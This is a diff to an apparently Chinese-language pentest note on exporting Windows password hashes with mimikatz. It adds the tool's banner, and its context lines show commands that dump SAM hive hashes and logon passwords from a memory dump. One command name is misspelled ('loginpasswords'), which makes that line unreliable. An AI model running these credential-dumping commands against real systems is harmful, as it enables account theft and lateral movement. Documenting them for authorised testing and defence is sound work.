@@ -38,6 +38,14 @@ mimikatz # lsadump::sam /sam:sam.hive /system:system.hive
 #### （2）通过mimikatz导出Hash
 ```
 $ ./mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
 mimikatz# sekurlsa::minidump 1.bin
 mimikatz# sekurlsa::loginpasswords full
 ```
